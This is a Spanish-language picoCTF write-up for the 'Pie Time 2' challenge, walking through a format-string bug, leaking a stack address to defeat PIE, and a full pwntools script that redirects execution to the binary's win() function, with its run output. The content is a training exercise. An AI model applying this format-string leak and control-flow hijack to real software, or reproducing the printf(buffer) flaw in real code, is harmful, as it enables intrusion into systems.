# Pie Time 2

En este ejercicio nos ofrecen un binario y su código en C.

```c
./vuln        
Enter your name:%p
0xa70
 enter the address to jump to, ex => 0x12345: 0x0
Segfault Occurred, incorrect address.
```

El programa nos deja introducir un input y luego nos pide una dirección a la que saltar.

El binario tiene una vulnerabilidad de format string:

```c
printf("Enter your name:");
fgets(buffer, 64, stdin);
printf(buffer);
```

El programa tiene una función de victoria `win`:

```c
int win() {
  FILE *fptr;
  char c;

  printf("You won!\n");
  // Open file
  fptr = fopen("flag.txt", "r");
  if (fptr == NULL)
  {
      printf("Cannot open file.\n");
      exit(0);
  }

  // Read contents from file
  c = fgetc(fptr);
  while (c != EOF)
  {
      printf ("%c", c);
      c = fgetc(fptr);
  }

  printf("\n");
  fclose(fptr);
}
```

Parece sencillo, simplemente hay que poner la dirección de la función `win` para resolver el reto. Pero hay un problema, el binario tiene `PIE` activado:

```c
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

Tenemos que descubrir primero cual es la dirección base del binario. Para esto podemos intentar leakear gracias al format string la dirección a una instrucción del programa.

Para esto podemos con un fuzzer sacar direcciones del stack y intentar encontrar una que sirva. Para no probar todo lo que aparece, las direcciones que interesan suelen empezar por 555 o estar cerca.

```c
. . .
1: b'AAAAAAA0x3125414141414141\n'  // Parametro controlable
. . .
4: b'AAAAAAA0x5555555592ac\n' // Interesante
. . .
19: b'AAAAAAA0x555555555441\n' // Intereante
. . .
```

```c
pwndbg> info symbol 0x555555555441
main + 65 in section .text of /home/ub1cu0/Desktop/picoCTF/pie_time_2/vuln_patched
```

Esta sirve! Vamos a calcular un offset para que pwntools pueda saber donde está la base del binario:

```c
pwndbg> piebase
Calculated VA from /home/ub1cu0/Desktop/picoCTF/pie_time_2/vuln_patched = 0x555555554000

offset = 0x555555555441 - 0x555555554000 = 0x1441
```

Ahora ya podemos hacer el script:

```python
#!/usr/bin/env python3
from pwn import *

exe = ELF('./vuln_patched')
context.binary = exe

LEAK_OFFSET = 0x1441

def conn():
    if args.LOCAL:
        return process([exe.path])
    return remote('rescued-float.picoctf.net', 65508)

def main():
    r = conn()

    format = b'%p ' * 19
    r.sendlineafter(b'Enter your name:', format)

    leak_line = r.recvline().decode().strip()
    leak      = leak_line.split()[18]
    log.info(f'Leak: {leak}')

    pie_base = int(leak, 16) - LEAK_OFFSET
    exe.address = pie_base
    win = exe.symbols.win
    log.info(f'PIE base: {hex(pie_base)}')
    log.info(f'win() addr: {hex(win)}')

    r.sendline(hex(win).encode())

    r.interactive()

if __name__ == '__main__':
    main()
```

```c
   ~/Desktop/picoCTF/pie_time_2 ❯ python3 solve.py      
[*] '/home/ub1cu0/Desktop/picoCTF/pie_time_2/vuln_patched'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[+] Opening connection to rescued-float.picoctf.net on port 59789: Done
[*] Leak: 0x5910d83d6441
[*] PIE base: 0x5910d83d5000
[*] win() addr: 0x5910d83d636a
[*] Switching to interactive mode
 enter the address to jump to, ex => 0x12345: You won!
picoCTF{SECRETO}
```

Tenemos la flag!
